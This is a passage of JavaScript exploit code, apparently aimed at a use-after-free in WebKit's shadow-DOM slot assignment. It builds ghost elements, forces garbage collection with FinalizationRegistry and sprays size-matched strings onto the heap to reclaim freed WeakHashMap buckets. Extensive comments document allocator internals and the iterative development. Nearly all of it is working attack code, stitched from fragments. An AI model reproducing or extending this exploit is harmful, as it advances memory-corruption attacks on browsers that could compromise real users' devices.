  //      just dropped it). Ghost[0] Node C++ is NOW freed. m_assignedNodes still has WeakPtr<Node>
  //      for ghost[0] — STALE. Call assignedNodes() IMMEDIATELY AFTER trigger assign (sync) →
  //      returns stale ghost[0] ptr → .nodeType = arb-read on freed Node C++ object.
  //
  //   ORDERING IN PROBE (v49):
  //     pump loop (SHRINK fires, dead ghosts[1..g-1] processed) →
  //     trigger assign(childA) [drops ghost[0] from m_manuallyAssignedElements → ghost[0] freed] →
  //     IMMEDIATE assignedNodes() [stale WeakPtr<Node> for ghost[0] still in m_assignedNodes] →
  //     read .nodeType etc on ghost[0] stale ptr → arb-read / crash
  let _ghostDeadCount = 0; // incremented by FinalizationRegistry callback for each dead ghost
  const _ghostRegistry = new FinalizationRegistry(() => { _ghostDeadCount++; });

  // v51: releaseGhosts — simplified from v50. No _ghost0 save. GC target = ALL ghosts.
  const releaseGhosts = () => {
    ghostElems.forEach(g => g.remove());        // step 1: remove from host tree
    // v51: assign(childA, childB) — complete ghost drop, slot = {childA, childB}.
    // Drops ALL ghosts from m_manuallyAssignedElements → ghosts C++ refcount -= 1.
    // ghostElems still holds refs → C++ refcount stays > 0 for all ghosts. Safe.
    targetSlot.assign(childA, childB);          // step 2: full ghost drop, slot = {childA, childB}
    // v51: NO _ghost0 save. All ghosts will die on GC. GC target = ALL ghosts.
    // step 3: register BEFORE clearing — must be live at register() time.
    ghostElems.forEach(g => _ghostRegistry.register(g, null));
    ghostElems.length = 0;                      // step 4: release JS refs → GC eligible
    // Slot state after releaseGhosts: {childA, childB} — opCount accumulates properly during pump.
  };

  // v51: childB UAF strategy — no ghost machinery needed.
  //
  // ROOT CAUSE of v50 failure: assign() ALWAYS calls clearManuallyAssignedNodes() which
  //   wipes m_assignedNodes and rebuilds it from scratch for the new assignment.
  //   injectGhostIntoAssignedNodes(): assign(childA,ghost0) then assign(childA) —
  //   the second assign() wiped ghost[0] from m_assignedNodes immediately. staleNodeCount=0.
  //
  // v51 FIX: Use childB itself as the UAF target. v48 confirmed (32/32):
  //   After releaseGhosts() does assign(childA, childB), m_assignedNodes has WeakPtr<childB>.
  //   Then assign(childA) → childB drops from m_manuallyAssigned BUT stale WeakPtr<childB>
  //   stays in m_assignedNodes (v48 proof: assignedNodes() returned childB after assign(childA)).
  //   WAIT — that was the v48 result. Let's verify: v48 used releaseGhosts doing assign(childA,childB)
  //   WITHOUT a subsequent assign(childA). The stale childB came from m_assignedNodes populated
  //   during releaseGhosts assign(childA,childB). assignedNodes() returned childB directly.
  //
  // v51 APPROACH:
  //   releaseGhosts(): assign(childA, childB) → m_assignedNodes = {childA, childB} (BOTH).
  //                    then assign(childA) → m_manuallyAssigned = {childA}, but
  //                    m_assignedNodes NOT cleared if assign() doesn't rehash... actually
  //                    assign() DOES clearManuallyAssignedNodes(). So m_assignedNodes = {childA}.
  //   Hmm. v48 showed syncAnomaly=true with stale childB. Let's check what v48 actually did:
  //   v48 releaseGhosts did assign(childA, childB) then assignedNodes() returned childB.
  //   That means childB was returned LIVE as a stale entry in m_assignedNodes after assign(childA,childB).
  //   That's not a stale freed node — childB is alive, but it IS in m_assignedNodes as a valid entry.
  //   The stale part was: m_assignedNodes returning childB even though slot was reassigned away from childB.
  //
  // CORRECT v51 STRATEGY (confirmed by v48 behavior):
  //   Step A: assign(childA, childB)   → slot={childA,childB}, m_assignedNodes={childA,childB}
  //   Step B: assign(childA)           → slot={childA}, m_manuallyAssigned={childA}
  //              → clearManuallyAssignedNodes() wipes m_assignedNodes, rebuilds → {childA} only

// SECTION C: Heap Spray
//
// WeakHashMap<ManualSlotAssignment*, ...> bucket layout (WebKit source):
//   HashTable uses WTF::WeakHashMap which uses FastMalloc.
//   Bucket array = capacity × sizeof(bucket) where bucket ≈ 16B (key+value).
//   For ghosts=N: initial capacity ≈ nextPowerOf2(N*1.3) → 32..128 entries.
//   Rehash doubles capacity. So freed array size = capacity×16B = 512–2048B.
//
// Strategy: spray ArrayBuffers at MATCHING SIZES for the freed bucket array.
// We spray several size classes to bracket the actual allocation.
// Each buf is filled with a discriminator pattern. After each UAF trigger,
// we immediately scan — if a buf's pattern got clobbered = bucket reuse hit.
// ═══════════════════════════════════════════════════════════════════════════

// ── v12: StringImpl spray ─────────────────────────────────────────────────────
// v11 root cause confirmed: JS ArrayBuffer backing stores live in bmalloc Gigacage
// (a separate guarded mmap region), NOT in WTF::FastMalloc. WeakHashMap bucket
// arrays use WTF::FastMalloc. Two completely separate heaps → ArrayBuffer spray
// CAN NEVER reach FastMalloc slots regardless of volume or timing.
//
// FIX: spray with JS strings, which are backed by WTF::StringImpl → WTF::fastMalloc.
// Same allocator as WeakHashMap bucket arrays → real overlap is possible.
//
// StringImpl layout (arm64, WTF source):
//   [0..3]  : refCount (u32) — 1 for a live ref
//   [4..7]  : length (u32)   — char count
//   [8..11] : m_hash (u32)   — set lazily; MUST be non-zero for isLive() = true
//   [12..15]: hashAndFlags (u32)
//   [16+]   : char data (1B each for Latin-1 strings)
//
// Total StringImpl allocation size = 16B header + charCount B.
// For freed bucket size S: charCount = S - 16.
//
// When stale effectiveCurrent ptr reads bytes [0..7] of our StringImpl:
//   WeakImpl.key = u64(refCount | length<<32) = u64(1 | charCount<<32)
//   e.g. charCount=496 → key = 0x000001F000000001 → unmapped arm64 VA → crash
//
// WeakImpl.m_count = bytes [8..11] = m_hash. Must be non-zero → isLive()=true.
// Force hash computation on each string before the deref window to guarantee non-zero.
//
// Size classes → char counts:
//   512B  → 496 chars
//   1024B → 1008 chars
//   2048B → 2032 chars
//   4096B → 4080 chars

const SPRAY_SIZES = [512, 1024, 2048, 4096];
const PER_SIZE    = 64;   // strings per size class

// Build a unique string of exactly charCount Latin-1 chars.
// Use a counter-based prefix to prevent JS engine string deduplication/interning.
let _strCounter = 0;
function makeSprayString(charCount) {
  // Prefix with a counter (as chars 0x01–0x04) to ensure uniqueness.
  // Body = 0x01 repeated. Total = charCount chars.
  const prefix = String.fromCharCode(
    (_strCounter & 0xFF) + 1,
    ((_strCounter >> 8) & 0xFF) + 1,
    ((_strCounter >> 16) & 0xFF) + 1,
    ((_strCounter >> 24) & 0xFF) + 1
  );
  _strCounter++;
  const body = '\x01'.repeat(Math.max(0, charCount - 4));
  return prefix + body;
}

// Force hash computation on a string (sets m_hash in StringImpl → non-zero).
// Using the string as a Map key is the most reliable way to trigger hash computation.
const _hashForceMap = new Map();
let _hashForceKey = 0;
function forceStringHash(s) {
  _hashForceMap.set(s, _hashForceKey++);
}
// Drain the map periodically so it doesn't grow unbounded
function drainHashMap() { if (_hashForceMap.size > 2000) _hashForceMap.clear(); }

// v32: forceHashAndRelease moved to global scope (was inside uafSetup() in v31 — caused
//   ReferenceError in Phase 4 pre-spray which runs outside the uafSetup closure).
// Sets m_hash on strings via a throwaway map, then clears map — strings stay primed
//   with non-zero m_hash in their StringImpl memory without being anchored in _hashForceMap.
// Called from: primeFreelist(), primeHalfFreelist() (inside uafSetup closure, was fine)
//          AND: Phase 4 pre-spray blocks (outside uafSetup closure — was broken in v31)
function forceHashAndRelease(strings) {
  const tmp = new Map();
  for (let i = 0; i < strings.length; i++) tmp.set(strings[i], i);
  tmp.clear(); // release map refs — only caller's array holds strings now
}

function heapSpray() {
  // Spray across all size classes using StringImpl-backed strings.
  // StringImpl uses WTF::fastMalloc → same heap as WeakHashMap bucket arrays.
  const pools = {};  // size → [string, string, ...]
  for (const sz of SPRAY_SIZES) {
    const charCount = sz - 16; // StringImpl header = 16B
    pools[sz] = [];
    for (let i = 0; i < PER_SIZE; i++) {
      const s = makeSprayString(charCount);
      forceStringHash(s); // ensure m_hash != 0
      pools[sz].push(s);
    }
    drainHashMap();
  }
  const total = SPRAY_SIZES.reduce((s,sz) => s + PER_SIZE, 0);
  log(`[SPRAY] v13: ${total} StringImpl strings across sizes ${SPRAY_SIZES.join('/')}B (WTF::fastMalloc)`);
  return pools;
}

// Release a pool to let allocator reuse those slots for the incoming free
function releasePool(pools, sz) {
  if (!pools[sz]) return;
  pools[sz] = null;  // GC can reclaim string refs → FastMalloc returns slots to free-list
}

// Check assignedNodes() return for anomalies:
// Expected post-assign: length=1, only the newChild we just assigned.
// Stale-pointer read from freed bucket can return ghost nodes or wrong count.
function checkNodeLeak(nodes, expectedNode) {
  if (!nodes) return null;
  if (nodes.length !== 1) return { anomaly: 'length', len: nodes.length };
  if (nodes[0] !== expectedNode) return { anomaly: 'identity' };
  return null;
}

  // v53: skip on retry — Phase 6B builds its own fresh pool per probe
  if (!_v52RetryState) {
    log('\n[*] Phase 2: Heap spray (size-matched to WeakHashMap bucket arrays)...');
    await new Promise(r => setTimeout(r, 100));
    sprayPools = heapSpray();
    await new Promise(r => setTimeout(r, 100));
    log('[*] Spray in place');
  } else {
    log('[v53] Retry: skipping phase 2 heap spray');
  }
  log('[*] Spray in place');

  // ─── Phase 3: UAF Setup ──────────────────────────────────────────────────

  // freed = initial capacity × 16B (old bucket freed when shrink fires after GC):
  //   ghosts=20 → cap=32  → freed=512B
  //   ghosts=30 → cap=64  → freed=1024B
  //   ghosts=50 → cap=128 → freed=2048B
  //   ghosts=100→ cap=256 → freed=4096B
